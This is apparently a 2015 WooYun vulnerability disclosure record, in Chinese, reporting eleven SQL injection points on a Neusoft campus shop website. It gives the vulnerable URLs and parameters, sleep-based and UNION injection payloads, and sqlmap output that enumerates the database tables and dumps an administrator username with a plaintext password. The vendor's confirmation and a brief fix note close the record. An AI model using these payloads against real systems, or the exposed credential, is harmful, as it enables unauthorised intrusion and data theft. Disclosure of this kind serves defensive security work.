{"id": 65557, "wybug_id": "wooyun-2015-0134402", "wybug_title": "东软集团某站十一处SQL注入打包", "wybug_corp": "东软集团", "wybug_author": "路人甲", "wybug_date": "2015-08-17 13:36", "wybug_open_date": "2015-10-05 09:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向公众公开  简要描述： RT，上个首页可否 详细说明：  十一处SQL注入打包，密码明文存储SQL注入打包，八处，多参数第一处：\nhttp://shop.neusoft.edu.cn/ChocolateServlet?id=*参数id存在注入\n第二处：\nhttp://shop.neusoft.edu.cn/Findfoodservlet?food_name=*&order_list_title=%25E7%259B%2596%25E9%25A5%25AD%25E7%25B1%25BB&_=1439687116971food_name参数，order_list_title参数存在注入\n第三处：\nhttp://shop.neusoft.edu.cn/InterestFoodDetailServlet?food_id=cho2013111813324027food_id参数存在注入\n第四处：\nhttp://shop.neusoft.edu.cn/LatticeServletpost参数-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"button\"Ìá½»ÉêÇë-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"main\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"pageId\"addLatticeServlet-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"phonenum\"(select(0)from(select(sleep(0)))v)/*'+(select(0)from(select(sleep(0)))v)+'\"+(select(0)from(select(sleep(0)))v)+\"*/-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"qqnum\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"salProdClass\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"shopAlias\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"shopDesc\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"shopKeeperId\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"shopWebsite\"http://www.vulnweb.com-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"studentofdept\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"studentofmajor\"1-------AcunetixBoundary_SBQXWVPJHVContent-Disposition: form-data; name=\"shopShowImg\"; filename=\"acunetix.txt\"Content-Type: text/plain-------AcunetixBoundary_SBQXWVPJHV--参数phonenum,qqnum,salProdClass,shopAlias,shopDesc,shopWebsite都存在注入\n第五处：\nhttp://shop.neusoft.edu.cn/Like_findservlet?Food_name=*&_=1439687116968参数Food_name存在注入\n第六处：\nhttp://shop.neusoft.edu.cn/NeusoftKnowServlet?pageId=questionDetail&questionId=*参数questionId存在注入\n第七处：\nhttp://shop.neusoft.edu.cn/NewsServlet?newsId=*&pageId=newsDetail参数newsId存在sql注入\n第八处：\nhttp://shop.neusoft.edu.cn/RegistServlet?Id=*&password=g00dPa%24%24w0rD&user2=student参数Id参数和password参数都存在注入\n第九处：\nhttp://shop.neusoft.edu.cn/InterestFindKindservlet?food_name=*&order_list_title=%25E6%25B0%25B4%25E6%259E%259C%25E7%25B1%25BB&_=1439650016267参数food_name和参数order_list_title都存在注入\n第十处：\nhttp://shop.neusoft.edu.cn/InterestFoodLikeServlet?Food_name=*&_=1439650016265参数Food_name存在注入\n第十一处：\nhttp://shop.neusoft.edu.cn/LoginServlet?button=%e7%99%bb%e9%99%86&fromTag=commLogin&funParam=null&Id=-1&pageId=login&password=g00dPa%24%24w0rD&user2=student参数ID存在注入，password存在注入\n   漏洞证明：  \nsqlmap identified the following injection points with a total of 297 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' AND 6908=6908 AND 'GsLQ' LIKE 'GsLQ&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector: AND [INFERENCE]    Type: UNION query    Title: MySQL UNION query (63) - 27 columns    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' UNION ALL SELECT 63,63,CONCAT(0x716a6a7a71,0x5973656f7779677a6544,0x7171716b71),63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector:  UNION ALL SELECT 63,63,[QUERY],63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#---web application technology: Nginxback-end DBMS: MySQL >= 5.0.0current user:    'shop.is@%'current database:    'shop.is'current user is DBA:    Falseavailable databases [2]:[*] information_schema[*] shop.issqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' AND 6908=6908 AND 'GsLQ' LIKE 'GsLQ&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector: AND [INFERENCE]    Type: UNION query    Title: MySQL UNION query (63) - 27 columns    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' UNION ALL SELECT 63,63,CONCAT(0x716a6a7a71,0x5973656f7779677a6544,0x7171716b71),63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector:  UNION ALL SELECT 63,63,[QUERY],63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#---web application technology: Nginxback-end DBMS: MySQL 5available databases [2]:[*] information_schema[*] shop.isDatabase: shop.is[43 tables]+-------------------------------+| Food                          || Restaurant_phone              || admin_user                    || choc_order                    || chocolate                     || common_address                || diaocha                       || dish_detail                   || dish_detail_history           || dish_order                    || dish_order_detail             || dish_order_detail_history     || dish_order_history            || drink                         || food_phone                    || friends_link                  || gift_info                     || interest_cate                 || interest_food                 || interest_order                || interest_order_detail         || interest_order_detail_history || interest_order_history        || interest_provider             || lattice_shop                  || major_shop                    || network_master                || neusoft_know_answer           || neusoft_know_question         || print_history                 || print_info                    || print_info_history            || print_price_config            || restaurant                    || school_news                   || school_notice                 || squence_number                || student_user                  || student_user_history          || teacher_user                  || used_prod                     || user_phone                    || visitor_num                   |+-------------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' AND 6908=6908 AND 'GsLQ' LIKE 'GsLQ&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector: AND [INFERENCE]    Type: UNION query    Title: MySQL UNION query (63) - 27 columns    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' UNION ALL SELECT 63,63,CONCAT(0x716a6a7a71,0x5973656f7779677a6544,0x7171716b71),63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector:  UNION ALL SELECT 63,63,[QUERY],63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#---web application technology: Nginxback-end DBMS: MySQL 5available databases [2]:[*] information_schema[*] shop.isDatabase: shop.isTable: admin_user[4 columns]+------------+--------------+| Column     | Type         |+------------+--------------+| admin_id   | varchar(30)  || admin_name | varchar(30)  || admin_tag  | varchar(100) || password   | varchar(30)  |+------------+--------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' AND 6908=6908 AND 'GsLQ' LIKE 'GsLQ&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector: AND [INFERENCE]    Type: UNION query    Title: MySQL UNION query (63) - 27 columns    Payload: http://shop.neusoft.edu.cn:80/InterestFindKindservlet?food_name=' UNION ALL SELECT 63,63,CONCAT(0x716a6a7a71,0x5973656f7779677a6544,0x7171716b71),63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#&order_list_title=%E6%B0%B4%E6%9E%9C%E7%B1%BB&_=1439650016267    Vector:  UNION ALL SELECT 63,63,[QUERY],63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63,63#---web application technology: Nginxback-end DBMS: MySQL 5available databases [2]:[*] information_schema[*] shop.isDatabase: shop.isTable: admin_user[1 entry]+------------+----------+| admin_name | password |+------------+----------+| neusoft    | 10021050 |+------------+----------+\n   修复方案：  参数过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-21 09:01 厂商回复： 维护部门反馈，问题确认。感谢作者提供的漏洞信息。已经要求维护部门先行下线处理。修复后再上线。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}